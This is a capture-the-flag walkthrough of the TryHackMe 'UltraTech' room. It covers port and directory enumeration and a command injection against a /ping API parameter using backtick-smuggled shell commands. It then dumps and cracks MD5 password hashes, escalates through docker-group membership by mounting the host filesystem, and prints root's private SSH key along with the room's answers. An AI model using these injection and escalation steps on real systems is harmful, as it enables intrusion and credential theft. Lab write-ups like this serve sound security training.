# UltraTech — TryHackMe Walkthrough

> The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing.

<p align="center"><a href="https://tryhackme.com/room/ultratech1"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/e0f6687c43305e3b67a6cb38951d7b56.png" alt="UltraTech" border="0"></a></p>

<p align="center">
  <a href="https://tryhackme.com/room/ultratech1"><img src="https://img.shields.io/badge/TryHackMe-UltraTech-red" /></a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange" />
  <img src="https://img.shields.io/badge/Platform-Linux-blue" />
  <img src="https://img.shields.io/badge/Focus-Web%20Enumeration%20%7C%20Command%20Injection%20%7C%20Privilege%20Escalation-green" />
</p>

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | Web Poking |
| 4 | Command Injection |
| 5 | Brute Forcing Hashes |
| 6 | Docker Exploitation |

## Learning Objectives

- Perform a full TCP port scan and identify services running on non-standard ports
- Enumerate web applications with directory brute forcing and inspect client-side JavaScript for hidden API endpoints
- Identify and exploit a command injection vulnerability in a REST API parameter
- Extract and crack password hashes recovered from a SQLite database
- Escalate privileges by abusing Docker group membership to gain a root shell

## Prerequisites

- Nmap
- Gobuster
- Hashcat with the rockyou.txt wordlist
- SSH client
- A web browser or curl for interacting with the REST API

## Tasks and Steps

## [Task 1] — Deploy the Machine

### Step 1 — Deploy the target machine

**Approach:** Start the room by deploying the machine from the TryHackMe room page. No commands are required for this step, it simply provisions the target and assigns it an IP address.

> **Note:** This step just spins up the vulnerable VM on TryHackMe's infrastructure. Once deployed, the machine's IP address (referred to as Machine_IP throughout this walkthrough) becomes your target for all following enumeration and exploitation steps.

### Task 1.1 — Deploy the machine

> **Note:** This task has no question to answer, it is simply confirming the machine has been started.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

## [Task 2] — It's Enumeration Time

### Step 2 — Run a full TCP port scan

**Approach:** Begin enumeration with a full port range Nmap scan, enabling service version detection and default scripts to identify what is running on the host.

```
kali@kali:~/CTFs/tryhackme/UltraTech$ sudo nmap -Pn -sS -sC -sV -p- Machine_IP
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 15:44 CEST
Nmap scan report for Machine_IP
Host is up (0.041s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.09 seconds
```

> **Note:** This scan reveals four open ports. Port 21 runs FTP, port 22 runs SSH, and two HTTP services are exposed on non-standard ports: 8081, which is a Node.js Express REST API, and 31331, which is an Apache web server hosting the main UltraTech website. The two web services are likely related, with the Apache site acting as the frontend and the Node.js service acting as a backend API.

### Task 2.1 — Which software is using the port 8081?

<details><summary>Reveal Answer</summary>

Node.js

</details>

### Task 2.2 — Which other non-standard port is used?

<details><summary>Reveal Answer</summary>

31331

</details>

### Task 2.3 — Which software using this port?

<details><summary>Reveal Answer</summary>

Apache

</details>

### Task 2.4 — Which GNU/Linux distribution seems to be used?

<details><summary>Reveal Answer</summary>

Ubuntu

</details>

### Step 3 — Brute force directories on the API and web server

**Approach:** Use Gobuster against both web ports to enumerate hidden directories and files, starting with the Node.js API on port 8081.

```
kali@kali:~/CTFs/tryhackme/UltraTech$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://Machine_IP:8081
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://Machine_IP:8081
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 15:53:07 Starting gobuster
===============================================================
/auth (Status: 200)
Progress: 2488 / 4615 (53.91%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/07 15:53:31 Finished
===============================================================
```

> **Note:** Only one route, /auth, was found before the scan was interrupted. This is likely the endpoint the login form on the main site submits credentials to.

**Approach:** Run the same Gobuster scan against the Apache server on port 31331 to map out the website's structure.

```
kali@kali:~/CTFs/tryhackme/UltraTech$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://Machine_IP:31331
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://Machine_IP:31331
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 16:17:27 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/favicon.ico (Status: 200)
/images (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/js (Status: 301)
/javascript (Status: 301)
===============================================================
2020/10/07 16:17:45 Finished
===============================================================
```

> **Note:** The standard Apache and htaccess files return 403 Forbidden as expected, but the /js directory stands out as worth investigating, since client-side JavaScript often reveals how the frontend communicates with the backend API.

### Step 4 — Inspect the site's JavaScript for API details

**Approach:** Retrieve the api.js file found under the /js directory to understand how the frontend interacts with the Node.js API on port 8081.

* [http://Machine_IP:31331/js/api.js](http://Machine_IP:31331/js/api.js)

```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

> **Note:** This script reveals two routes on the API: /ping, which takes an ip parameter and is presumably used to check connectivity, and /auth, which is where the login form submits its data. The /ping endpoint is the more interesting of the two, since passing user input directly into what is likely a shell ping command is a classic setup for command injection.

### Task 2.5 — The software using the port 8080 is a REST api, how many of its routes are used by the web application?

> **Note:** Although the question references port 8080, the relevant service is actually on port 8081 based on the earlier scan and the JavaScript file. The two routes identified by enumeration and source review are /ping and /auth.

<details><summary>Reveal Answer</summary>

2

</details>

## [Task 3] — Let the Fun Begin

### Step 5 — Confirm command injection via the /ping endpoint

**Approach:** Test the /ping endpoint by appending a shell command after the IP parameter to see whether it gets executed on the server. List the contents of the current directory to look for interesting files.

```
http://Machine_IP:8081/ping?ip=127.0.0.1 `ls -la`
```

```
ping: utech.db.sqlite: Name or service not known 
```

> **Note:** The error message confirms command injection is working. The application tried to ping a host named after the output of ls -la, and one of the filenames it picked up was utech.db.sqlite. This tells us there is a SQLite database file sitting in the same directory as the application, which likely contains user credentials.

### Task 3.1 — There is a database lying around, what is its filename?

<details><summary>Reveal Answer</summary>

utech.db.sqlite

</details>

### Step 6 — Dump the contents of the database via command injection

**Approach:** Use the same injection technique to read the contents of the SQLite database file with cat, leveraging the ping error message as an output channel.

* [http://Machine_IP:8081/ping?ip=127.0.0.1 `cat utech.db.sqlite`](http://Machine_IP:8081/ping?ip=127.0.0.1%20%60cat%20utech.db.sqlite%60)

```
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded 
```

> **Note:** Even though the output is mangled by the binary SQLite format being squeezed into a hostname string, two usernames and their MD5 password hashes are still readable: r00t with hash f357a0c52799563c7c7b76c1e7543a32, and admin with hash 0d0ea5111e3c1def594c1684e3b9be84. The r00t account is the more interesting target since the name suggests it might have elevated privileges or SSH access.

### Task 3.2 — What is the first user's password hash?

<details><summary>Reveal Answer</summary>

f357a0c52799563c7c7b76c1e7543a32

</details>

### Step 7 — Crack the recovered password hashes

**Approach:** Use Hashcat with the rockyou.txt wordlist to crack both MD5 hashes recovered from the database, starting with the r00t user's hash.

```
kali@kali:~/CTFs/tryhackme/UltraTech$ hashcat f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

Hashes: 1 digests; 1 unique digests, 1 unique salts

f357a0c52799563c7c7b76c1e7543a32:n100906         
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: f357a0c52799563c7c7b76c1e7543a32
Time.Started.....: Wed Oct  7 16:32:18 2020 (4 secs)
Time.Estimated...: Wed Oct  7 16:32:22 2020 (0 secs)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
```

> **Note:** Hashcat cracked the r00t hash in seconds, since MD5 is fast to compute and the password was present in the rockyou wordlist. This password can now be tried against the SSH service identified earlier.

**Approach:** Crack the second hash belonging to the admin user using the same method.

```
kali@kali:~/CTFs/tryhackme/UltraTech$ hashcat 0d0ea5111e3c1def594c1684e3b9be84 /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

Hashes: 1 digests; 1 unique digests, 1 unique salts

0d0ea5111e3c1def594c1684e3b9be84:mrsheafy        
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 0d0ea5111e3c1def594c1684e3b9be84
Time.Started.....: Wed Oct  7 16:33:00 2020 (4 secs)
Time.Estimated...: Wed Oct  7 16:33:04 2020 (0 secs)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
```

> **Note:** Both hashes cracked instantly against rockyou, which is a strong reminder that MD5 with no salting and weak user passwords offers essentially no real protection. The r00t credentials are the priority here since that account name strongly suggests SSH access with elevated privileges.

### Task 3.3 — What is the password associated with this hash?

> **Note:** This refers to the hash belonging to the r00t user identified in the previous step.

<details><summary>Reveal Answer</summary>

n100906

</details>

## [Task 4] — The Root of All Evil

### Step 8 — SSH into the machine as r00t and check for privilege escalation paths

**Approach:** Use the cracked credentials to SSH into the machine as r00t, then check sudo permissions and group memberships to look for a way to escalate privileges.

```
kali@kali:~/CTFs/tryhackme/UltraTech$ ssh r00t@Machine_IP
The authenticity of host 'Machine_IP (Machine_IP)' can't be established.
ECDSA key fingerprint is SHA256:RWpgXxl3MyUqAN4AHrH/ntrheh2UzgJMoGAPI+qmGEU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'Machine_IP' (ECDSA) to the list of known hosts.
r00t@Machine_IP's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

  System load:  0.03               Processes:           101
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 74%                IP address for eth0: Machine_IP
  Swap usage:   0%

r00t@ultratech-prod:~$ ls -la
total 28
drwxr-xr-x 4 r00t r00t 4096 Oct  7 14:38 .
drwxr-xr-x 5 root root 4096 Mar 22  2019 ..
-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 .bashrc
drwx------ 2 r00t r00t 4096 Oct  7 14:38 .cache
drwx------ 3 r00t r00t 4096 Oct  7 14:38 .gnupg
-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

> **Note:** The r00t user cannot run sudo, but the id command shows they belong to the docker group. Membership in the docker group is effectively equivalent to root access on the host, because Docker containers can mount the host filesystem and run as root inside the container. This is a well-known privilege escalation technique documented on <a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank">GTFOBins</a>.

### Step 9 — Escalate to root by mounting the host filesystem in a Docker container

**Approach:** Check for any existing or pulled Docker images, then run a container that mounts the entire host filesystem and chroots into it to obtain a root shell on the host.

```
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
^C
r00t@ultratech-prod:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
r00t@ultratech-prod:~$ docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                       PORTS               NAMES
7beaaeecd784        bash                "docker-entrypoint.s…"   18 months ago       Exited (130) 18 months ago                       unruffled_shockley
696fb9b45ae5        bash                "docker-entrypoint.s…"   18 months ago       Exited (127) 18 months ago                       boring_varahamihira
9811859c4c5c        bash                "docker-entrypoint.s…"   18 months ago       Exited (127) 18 months ago                       boring_volhard
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami  
root
# /bin/bash
root@ad624c3147a8:~# ls -a
.  ..  .bash_history  .bashrc  .cache  .emacs.d  .gnupg  .profile  .python_history  .ssh  private.txt
root@ad624c3147a8:~# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```

> **Note:** The first attempt failed because the alpine image was not present locally and the host has no internet access to pull it. However, an existing local image called bash was already available from previous container runs, so it was used instead. By mounting the root filesystem at /mnt and running chroot /mnt sh, the shell effectively breaks out of the container context and operates as root on the host filesystem. From there, cat .ssh/id_rsa exposes the root user's private SSH key, completing the privilege escalation chain.

### Task 4.1 — What are the first 9 characters of the root user's private SSH key?

> **Note:** Look at the first line of the body of the RSA private key, immediately after the BEGIN header.

<details><summary>Reveal Answer</summary>

MIIEogIBA

</details>

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Deployed the target machine | Machine provisioned and assigned an IP address |
| 2 | Ran a full TCP port scan with Nmap | Identified FTP, SSH, and two HTTP services on ports 8081 and 31331 |
| 3 | Brute forced directories on both web ports with Gobuster | Discovered the /auth API route and a /js directory on the main website |
| 4 | Reviewed the site's api.js file | Identified the /ping and /auth API endpoints and how the frontend uses them |
| 5 | Tested the /ping endpoint for command injection | Confirmed injection and discovered a SQLite database file on the server |
| 6 | Used command injection to read the database file | Recovered two usernames and their MD5 password hashes |
| 7 | Cracked both hashes with Hashcat and rockyou.txt | Recovered plaintext passwords for both accounts |
| 8 | Logged in via SSH as r00t and checked privileges | Found r00t could not use sudo but was a member of the docker group |
| 9 | Mounted the host filesystem inside a Docker container and chrooted into it | Obtained a root shell on the host and read the root user's private SSH key |
